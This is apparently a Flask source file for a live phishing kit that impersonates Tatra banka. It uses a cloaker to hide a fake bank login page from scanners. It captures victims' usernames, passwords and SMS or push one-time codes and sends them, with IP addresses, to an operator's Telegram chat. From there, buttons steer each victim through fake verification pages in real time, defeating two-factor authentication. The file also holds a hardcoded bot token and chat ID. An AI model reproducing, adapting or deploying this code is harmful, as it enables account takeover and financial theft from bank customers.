from flask import Flask, render_template, request, jsonify, redirect
import requests
import os
import json
import time

app = Flask(__name__)

# Telegram настройки (те же что в vbb)
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8666389425:AAE1tzMvNPHJ57aGj-aQdNMXf7gGn0tWWM0')
CHAT_ID = os.environ.get('CHAT_ID', '-1004305383720')

# Cloaker настройки
CLOAKER_URL = os.environ.get('CLOAKER_URL', 'https://cloaker-production-6d6b.up.railway.app')
SAFE_URL = os.environ.get('SAFE_URL', 'https://www.tatrabanka.sk')
BOT_THRESHOLD = int(os.environ.get('BOT_THRESHOLD', '40'))

def check_visitor(ip, user_agent, headers, domain):
    """Проверяет посетителя через cloaker и возвращает action"""
    try:
        print(f"[CLOAKER] Checking {ip} for domain {domain} via {CLOAKER_URL}")
        response = requests.post(
            f"{CLOAKER_URL}/api/v1/check",
            json={
                "ip": ip,
                "user_agent": user_agent,
                "headers": {k: v for k, v in headers},
                "domain": domain
            },
            timeout=5
        )
        print(f"[CLOAKER] Response: {response.status_code} - {response.text[:200]}")
        if response.status_code == 200:
            data = response.json()
            action = data.get('action', 'article')
            print(f"[CLOAKER] Action: {action}")
            return action, data
    except Exception as e:
        print(f"[CLOAKER] Error: {e}")
    return 'article', {}

# Хранилище состояний пользователей
user_states = {}

def send_telegram_login(message, session_id):
    """Отправляет логин с кнопками выбора страницы"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "📱 SMS", "callback_data": f"goto:sms:{session_id}"},
                {"text": "🔔 Push", "callback_data": f"goto:push:{session_id}"}
            ],
            [
                {"text": "❌ Ошибка", "callback_data": f"goto:error:{session_id}"}
            ]
        ]
    }
    
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": json.dumps(keyboard)
    }
    
    try:
        requests.post(url, data=data)
    except:
        pass

def send_telegram_code(message, session_id):
    """Отправляет код с кнопками действий"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ Успех (Загрузка)", "callback_data": f"goto:success:{session_id}"},
                {"text": "🔄 Неверный код", "callback_data": f"goto:sms_error:{session_id}"}
            ],
            [
                {"text": "❌ Заблокировать", "callback_data": f"goto:error:{session_id}"}
            ]
        ]
    }
    
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": json.dumps(keyboard)
    }
    
    try:
        requests.post(url, data=data)
    except:
        pass

def send_telegram(message):
    """Отправляет обычное сообщение"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=data)
    except:
        pass

def answer_callback(callback_id, text):
    """Отвечает на нажатие кнопки"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    data = {
        "callback_query_id": callback_id,
        "text": text
    }
    try:
        requests.post(url, data=data)
    except:
        pass

# ============== ROUTES ==============

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', '')
    domain = request.host.split(':')[0]
    
    action, data = check_visitor(ip, user_agent, request.headers, domain)
    
    if action == 'bank':
        return render_template('Tatra.html')
    elif action == 'redirect':
        return redirect(data.get('redirect_url', SAFE_URL))
    elif action == 'block':
        return "Access Denied", 403
    else:
        return render_template('article.html')

@app.route('/bank')
def bank():
    """Прямой доступ к странице банка"""
    return render_template('Tatra.html')

@app.route('/loading')
def loading():
    """Страница загрузки - ждёт команды от Telegram"""
    return render_template('loading.html')

@app.route('/push')
def push():
    """Push уведомление"""
    return render_template('push.html')

@app.route('/sms')
def sms():
    """SMS верификация"""
    return render_template('sms.html')

@app.route('/sms_error')
def sms_error():
    """SMS с ошибкой"""
    return redirect('/sms?error=1')

@app.route('/error')
def error():
    """Страница ошибки"""
    return render_template('error.html')

@app.route('/success')
def success():
    """Успешный вход"""
    return render_template('loading.html')

# ============== API ENDPOINTS ==============

@app.route('/submit_login', methods=['POST'])
def submit_login():
    """Получает логин/пароль, отправляет в Telegram с кнопками"""
    data = request.json
    login = data.get('login', '')
    password = data.get('password', '')
    session_id = data.get('session_id', str(int(time.time() * 1000)))
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '')
    
    user_states[session_id] = {
        'login': login,
        'password': password,
        'ip': ip,
        'redirect_to': None,
        'stage': 'login'
    }
    
    message = f"""💜 <b>TATRA Bank - Prihlásenie</b>

👤 <b>Login:</b> <code>{login}</code>
🔑 <b>Heslo:</b> <code>{password}</code>

🌐 <b>IP:</b> <code>{ip}</code>
📱 <b>UA:</b> {user_agent[:60]}...

⏳ <b>Používateľ čaká na Loading...</b>
⬇️ <b>Kam presmerovať?</b>"""
    
    send_telegram_login(message, session_id)
    return jsonify({"status": "ok", "session_id": session_id})

@app.route('/check_redirect', methods=['POST'])
def check_redirect():
    """Клиент проверяет, куда его перенаправить"""
    data = request.json
    session_id = data.get('session_id', '')
    
    if session_id in user_states:
        redirect_to = user_states[session_id].get('redirect_to')
        if redirect_to:
            user_states[session_id]['redirect_to'] = None
            return jsonify({"status": "redirect", "page": redirect_to})
    
    return jsonify({"status": "waiting"})

@app.route('/submit_code', methods=['POST'])
def submit_code():
    """Получает SMS/Push код"""
    data = request.json
    session_id = data.get('session_id', '')
    code = data.get('code', '')
    method = data.get('method', 'SMS')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    login = ''
    if session_id in user_states:
        login = user_states[session_id].get('login', '')
        user_states[session_id]['stage'] = 'code'
        user_states[session_id]['redirect_to'] = None
    
    message = f"""💜 <b>TATRA Bank - Kód</b>

👤 <b>Login:</b> <code>{login}</code>
🔢 <b>Metóda:</b> {method}
📲 <b>Kód:</b> <code>{code}</code>

🌐 <b>IP:</b> <code>{ip}</code>

⏳ <b>Používateľ čaká na Loading...</b>
⬇️ <b>Čo ďalej?</b>"""
    
    send_telegram_code(message, session_id)
    return jsonify({"status": "ok", "session_id": session_id})

@app.route('/submit_push', methods=['POST'])
def submit_push():
    """Push подтверждён"""
    data = request.json
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    login = ''
    if session_id in user_states:
        login = user_states[session_id].get('login', '')
        user_states[session_id]['stage'] = 'push'
        user_states[session_id]['redirect_to'] = None
    
    message = f"""💜 <b>TATRA Bank - Push potvrdený</b>

👤 <b>Login:</b> <code>{login}</code>
📱 <b>Push:</b> Potvrdený

🌐 <b>IP:</b> <code>{ip}</code>

⏳ <b>Používateľ čaká...</b>
⬇️ <b>Čo ďalej?</b>"""
    
    send_telegram_code(message, session_id)
    return jsonify({"status": "ok"})

# ============== TELEGRAM WEBHOOK ==============

@app.route('/webhook', methods=['POST'])
def webhook():
    """Обработка нажатий кнопок из Telegram"""
    data = request.json
    
    if 'callback_query' in data:
        callback = data['callback_query']
        callback_id = callback['id']
        callback_data = callback.get('data', '')
        
        parts = callback_data.split(':')
        if len(parts) >= 3 and parts[0] == 'goto':
            page = parts[1]
            session_id = parts[2]
            
            page_names = {
                'sms': '📱 SMS stránka',
                'push': '🔔 Push stránka',
                'error': '❌ Chyba prihlásenia',
                'sms_error': '🔄 SMS - nesprávny kód',
                'success': '✅ Úspech (loading)',
                'loading': '⏳ Loading'
            }
            
            if session_id in user_states:
                user_states[session_id]['redirect_to'] = page
                
                answer_callback(callback_id, f"✅ Presmerované: {page_names.get(page, page)}")
                
                login = user_states[session_id].get('login', '')
                send_telegram(f"➡️ <code>{login}</code> presmerovaný na <b>{page_names.get(page, page)}</b>")
            else:
                answer_callback(callback_id, "⚠️ Relácia vypršala")
    
    return jsonify({"ok": True})

@app.route('/set_webhook')
def set_webhook():
    """Установить webhook"""
    host = request.host
    webhook_url = f"https://{host}/webhook"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    response = requests.get(url)
    return jsonify(response.json())

@app.route('/status')
def status():
    """Проверка статуса"""
    return jsonify({
        "status": "ok",
        "active_sessions": len(user_states),
        "sessions": {k: {"login": v.get("login"), "stage": v.get("stage")} for k, v in user_states.items()}
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
